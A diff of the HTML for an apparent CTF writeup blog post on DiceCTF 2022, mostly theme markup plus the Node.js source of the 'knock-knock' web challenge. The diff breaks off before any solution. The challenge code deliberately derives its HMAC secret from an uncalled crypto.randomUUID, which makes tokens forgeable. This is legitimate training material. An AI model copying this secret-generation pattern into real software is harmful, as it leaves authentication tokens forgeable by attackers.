@@ -1,556 +1,585 @@
 <!DOCTYPE html>
-<html lang="en-us">
-  <head>
-    <title>DiceCTF 2022 | Welcome to Chovid99&#39;s Blog</title>
-
-    <meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-<meta name="viewport" content="width=device-width,minimum-scale=1">
-<meta property="og:title" content="DiceCTF 2022" />
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>DiceCTF 2022 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="DiceCTF 2022" />
 <meta property="og:description" content="Writeup for DiceCTF 2022 by Chovid99" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://chovid99.github.io/posts/dicectf-2022/" /><meta property="og:image" content="https://chovid99.github.io/site-feature-image.jpeg"/><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://chovid99.github.io/posts/dicectf-2022/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-02-07T08:01:00+07:00" />
-<meta property="article:modified_time" content="2022-02-07T08:01:00+07:00" />
+<meta property="article:modified_time" content="2023-02-23T18:03:33+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
 
 <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image:src" content="https://chovid99.github.io/site-feature-image.jpeg"/>
+<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png"/>
 
 <meta name="twitter:title" content="DiceCTF 2022"/>
 <meta name="twitter:description" content="Writeup for DiceCTF 2022 by Chovid99"/>
-<meta name="twitter:site" content="@Chovid99"/>
-<meta name="twitter:creator" content="@Chovid99"/>
-<meta property="og:site_name" content="Chovid99's Blog">
+<meta name="application-name" content="Chovid99&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/dicectf-2022/" /><link rel="prev" href="https://chovid99.github.io/posts/gcc-3.0-ctf-2022/" /><link rel="next" href="https://chovid99.github.io/posts/defcamp-ctf-2022/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "DiceCTF 2022",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/chovid99.github.io\/posts\/dicectf-2022\/"
+        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, DiceCTF, web, rsa, crypto, wasm, pwn, rop, format string, 2022","wordcount":  1660 ,
+        "url": "https:\/\/chovid99.github.io\/posts\/dicectf-2022\/","datePublished": "2022-02-07T08:01:00+07:00","dateModified": "2023-02-23T18:03:33+07:00","publisher": {
+            "@type": "Organization",
+            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
+                "@type": "Person",
+                "name": "Chovid99"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
-<meta name="generator" content="Hugo 0.105.0">
-
-
-  <META NAME="ROBOTS" CONTENT="INDEX, FOLLOW">
-
-
-<link rel="stylesheet" href="/css/style.css">
-<link rel="stylesheet" href="/css/tocbot.css">
-
-
-
-<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
-
-
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-
-    gtag('config', 'G-19HP521HQ9');
-  </script>
-
-
-
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
-<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
-<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
-    onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true}, {left: '\\[', right: '\\[', display: true}, {left: '$', right: '$', display: false}, {left: '\\(', right: '\\)', display: false}]});"></script>
-
-
-
-
-
-
-  </head>
-
-  <body>
-    <nav class="navigation">
-	
-		<a href="/"> <span class="arrow">←</span>Home</a>
-	
-	<a href="/posts">Posts</a>
-	<a href="/tags">Tags</a>
-	<a href="/about">About</a>
-
-	
-
-	
-</nav>
-
-
-    <main class="main">
-      
-
-<section id="single">
-    <h1 class="title">DiceCTF 2022</h1>
-
-    <div class="tip">
-        <time datetime="2022-02-07 08:01:00 &#43;0700 &#43;07">Feb 7, 2022</time>
-        <span class="split">
-          ·
-        </span>
-        <span>
-          1660 words
-        </span>
-        <span class="split">
-          ·
-        </span>
-        <span>
-          8 minute read
-        </span>
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                
+                
+            </a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
+        </div>
     </div>
-
-    <div class="content">
-      <div class="post-content js-toc-content">
-        <p>This CTF is quite fun because I got the chance to learn more about wasm. Here is my writeup for challenges that I solved during working on it.</p>
-<h1 id="web">Web <a href="#web" class="anchor">#</a></h1>
-<h2 id="knock-knock">knock-knock <a href="#knock-knock" class="anchor">#</a></h2>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">DiceCTF 2022</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/Chovid99" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chovid99</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Feb 07, 2022">Feb 07, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1660 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#knock-knock">knock-knock</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#interview-opportunity">interview-opportunity</a></li>
+      </ul>
+    </li>
+    <li><a href="#rev">Rev</a>
+      <ul>
+        <li><a href="#flagle">flagle</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#baby-rsa">baby-rsa</a></li>
+      </ul>
+    </li>
+    <li><a href="#social-media">Social Media</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This CTF is quite fun because I got the chance to learn more about wasm. Here is my writeup for challenges that I solved during working on it.</p>
+<h1 id="web">Web</h1>
+<h2 id="knock-knock">knock-knock</h2>
 <p>We were given source code like below.</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">const</span> crypto <span style="color:#555">=</span> require(<span style="color:#c30">&#39;crypto&#39;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">class</span> Database {
-</span></span><span style="display:flex;"><span>  constructor() {
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">this</span>.notes <span style="color:#555">=</span> [];
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">this</span>.secret <span style="color:#555">=</span> <span style="color:#c30">`secret-</span><span style="color:#a00">${</span>crypto.randomUUID<span style="color:#a00">}</span><span style="color:#c30">`</span>;
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  createNote({ data }) {
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">const</span> id <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">this</span>.notes.length;
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">this</span>.notes.push(data);
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> {
-</span></span><span style="display:flex;"><span>      id,
-</span></span><span style="display:flex;"><span>      token<span style="color:#555">:</span> <span style="color:#069;font-weight:bold">this</span>.generateToken(id),
-</span></span><span style="display:flex;"><span>    };
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  getNote({ id, token }) {
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (token <span style="color:#555">!==</span> <span style="color:#069;font-weight:bold">this</span>.generateToken(id)) <span style="color:#069;font-weight:bold">return</span> { error<span style="color:#555">:</span> <span style="color:#c30">&#39;invalid token&#39;</span> };
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (id <span style="color:#555">&gt;=</span> <span style="color:#069;font-weight:bold">this</span>.notes.length) <span style="color:#069;font-weight:bold">return</span> { error<span style="color:#555">:</span> <span style="color:#c30">&#39;note not found&#39;</span> };
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> { data<span style="color:#555">:</span> <span style="color:#069;font-weight:bold">this</span>.notes[id] };
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  generateToken(id) {
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> crypto
-</span></span><span style="display:flex;"><span>      .createHmac(<span style="color:#c30">&#39;sha256&#39;</span>, <span style="color:#069;font-weight:bold">this</span>.secret)
-</span></span><span style="display:flex;"><span>      .update(id.toString())
-</span></span><span style="display:flex;"><span>      .digest(<span style="color:#c30">&#39;hex&#39;</span>);
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">const</span> db <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Database();
-</span></span><span style="display:flex;"><span>db.createNote({ data<span style="color:#555">:</span> process.env.FLAG });
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">const</span> express <span style="color:#555">=</span> require(<span style="color:#c30">&#39;express&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">const</span> app <span style="color:#555">=</span> express();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app.use(express.urlencoded({ extended<span style="color:#555">:</span> <span style="color:#069;font-weight:bold">false</span> }));
-</span></span><span style="display:flex;"><span>app.use(express.<span style="color:#069;font-weight:bold">static</span>(<span style="color:#c30">&#39;public&#39;</span>));
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app.post(<span style="color:#c30">&#39;/create&#39;</span>, (req, res) =&gt; {
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">const</span> data <span style="color:#555">=</span> req.body.data <span style="color:#555">??</span> <span style="color:#c30">&#39;no data provided.&#39;</span>;
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">const</span> { id, token } <span style="color:#555">=</span> db.createNote({ data<span style="color:#555">:</span> data.toString() });
-</span></span><span style="display:flex;"><span>  res.redirect(<span style="color:#c30">`/note?id=</span><span style="color:#a00">${</span>id<span style="color:#a00">}</span><span style="color:#c30">&amp;token=</span><span style="color:#a00">${</span>token<span style="color:#a00">}</span><span style="color:#c30">`</span>);
-</span></span><span style="display:flex;"><span>});
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app.get(<span style="color:#c30">&#39;/note&#39;</span>, (req, res) =&gt; {
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">const</span> { id, token } <span style="color:#555">=</span> req.query;
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">const</span> note <span style="color:#555">=</span> db.getNote({
-</span></span><span style="display:flex;"><span>    id<span style="color:#555">:</span> <span style="color:#366">parseInt</span>(id <span style="color:#555">??</span> <span style="color:#c30">&#39;-1&#39;</span>),
-</span></span><span style="display:flex;"><span>    token<span style="color:#555">:</span> (token <span style="color:#555">??</span> <span style="color:#c30">&#39;&#39;</span>).toString(),
-</span></span><span style="display:flex;"><span>  });
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (note.error) {
-</span></span><span style="display:flex;"><span>    res.send(note.error);
-</span></span><span style="display:flex;"><span>  } <span style="color:#069;font-weight:bold">else</span> {
-</span></span><span style="display:flex;"><span>    res.send(note.data);
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>});
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app.listen(<span style="color:#f60">3000</span>, () =&gt; {
-</span></span><span style="display:flex;"><span>  console.log(<span style="color:#c30">&#39;listening on port 3000&#39;</span>);
-</span></span><span style="display:flex;"><span>});
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">class</span> <span class="nx">Database</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">constructor</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">notes</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">secret</span> <span class="o">=</span> <span class="sb">`secret-</span><span class="si">${</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">randomUUID</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">createNote</span><span class="p">({</span> <span class="nx">data</span> <span class="p">})</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">id</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">notes</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">notes</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">id</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">token</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">generateToken</span><span class="p">(</span><span class="nx">id</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">getNote</span><span class="p">({</span> <span class="nx">id</span><span class="p">,</span> <span class="nx">token</span> <span class="p">})</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">token</span> <span class="o">!==</span> <span class="k">this</span><span class="p">.</span><span class="nx">generateToken</span><span class="p">(</span><span class="nx">id</span><span class="p">))</span> <span class="k">return</span> <span class="p">{</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;invalid token&#39;</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">id</span> <span class="o">&gt;=</span> <span class="k">this</span><span class="p">.</span><span class="nx">notes</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="k">return</span> <span class="p">{</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;note not found&#39;</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span> <span class="nx">data</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">notes</span><span class="p">[</span><span class="nx">id</span><span class="p">]</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">generateToken</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">crypto</span>
